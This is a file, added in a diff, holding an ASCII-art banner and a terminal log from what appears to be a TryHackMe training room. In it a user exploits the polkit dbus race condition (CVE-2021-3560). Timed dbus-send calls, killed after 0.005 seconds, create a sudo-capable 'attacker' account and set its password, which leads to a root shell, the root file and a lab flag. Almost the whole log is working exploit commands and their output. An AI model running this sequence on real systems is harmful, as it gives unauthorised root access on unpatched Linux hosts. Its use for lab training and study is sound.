@@ -1,0 +1,78 @@
+┌──────────────────────────────────────────────────────────────┐
+│   ______                          ____          _         __ │
+│  / ____/_____ ___   ___   ____   / __ \ ____   (_)____   / /_│
+│ / / __ / ___// _ \ / _ \ / __ \ / /_/ // __ \ / // __ \ / __/│
+│/ /_/ // /   /  __//  __// / / // ____// /_/ // // / / // /_  │
+│\____//_/    \___/ \___//_/ /_//_/     \____//_//_/ /_/ \__/  │
+│                                                              │
+└──────────────────────────────────────────────────────────────┘
+┌──(kali㉿kali)-[~]
+└─$ ssh tryhackme@10.10.239.45
+The authenticity of host '10.10.239.45 (10.10.239.45)' can't be established.
+ED25519 key fingerprint is SHA256:wNbLBj6MWI66bkhdsgL4gMSkARgE8xdGNr+hJcY57WE.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.239.45' (ED25519) to the list of known hosts.
+tryhackme@10.10.239.45's password: 
+Permission denied, please try again.
+tryhackme@10.10.239.45's password: 
+
+
+         _____           _   _            _    __  __      
+        |_   _| __ _   _| | | | __ _  ___| | _|  \/  | ___ 
+          | || '__| | | | |_| |/ _` |/ __| |/ / |\/| |/ _ \
+          | || |  | |_| |  _  | (_| | (__|   <| |  | |  __/
+          |_||_|   \__, |_| |_|\__,_|\___|_|\_\_|  |_|\___|
+                   |___/                                   
+
+
+
+Last login: Sun Jun 13 13:06:56 2021 from 10.11.12.223
+tryhackme@polkit:~$ apt list --installed | grep policykit-1
+
+WARNING: apt does not have a stable CLI interface. Use with caution in scripts.
+
+policykit-1/focal,now 0.105-26ubuntu1 amd64 [installed,upgradable to: 0.105-26ubuntu1.1]
+tryhackme@polkit:~$ time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
+Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+
+real    0m0.011s
+user    0m0.001s
+sys     0m0.000s
+tryhackme@polkit:~$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
+[1] 1169
+tryhackme@polkit:~$ id attacker
+uid=1000(attacker) gid=1000(attacker) groups=1000(attacker),27(sudo)
+[1]+  Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
+tryhackme@polkit:~$ openssl passwd -6 Expl01ted
+$6$SvXCt2pr88RADIk9$YsZt4jD2nf4GacPmaBS7kdZtZJP3lJnEkcBRM70wKZofhCvlG2Bb4DCjyxV0dtvDwYL00/xc3tmiGIzgnc1US1
+tryhackme@polkit:~$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$SvXCt2pr88RADIk9$YsZt4jD2nf4GacPmaBS7kdZtZJP3lJnEkcBRM70wKZofhCvlG2Bb4DCjyxV0dtvDwYL00/xc3tmiGIzgnc1US1' string:'Ask the pentester' & sleep 0.005s; kill $!
+[1] 1213
+tryhackme@polkit:~$ su attacker
+Password: 
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+attacker@polkit:/home/tryhackme$ sudo -l
+[sudo] password for attacker: 
+Matching Defaults entries for attacker on polkit:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User attacker may run the following commands on polkit:
+    (ALL : ALL) ALL
+attacker@polkit:/home/tryhackme$ sudo -s
+root@polkit:/home/tryhackme# whoami
+root
+root@polkit:/home/tryhackme# id
+uid=0(root) gid=0(root) groups=0(root)
+root@polkit:/home/tryhackme# ls -l /root
+total 8
+-r-------- 1 root root   87 Dec 19 18:12 root.txt
+drwxr-xr-x 4 root root 4096 Jun 12  2021 snap
+root@polkit:/home/tryhackme# cat /root/root.txt
+toNEiL8li40=-HBJT9B6p0LMx+D91-uZUjXtSpouOd3DScfPbk79SKO3XxhED2Y47ZkPKTLpGbbIzdcxup1g==
+root@polkit:/home/tryhackme# 
+
+
+THM{N2I0MTgzZTE4ZWQ0OGY0NjdiNTQ0NTZi}
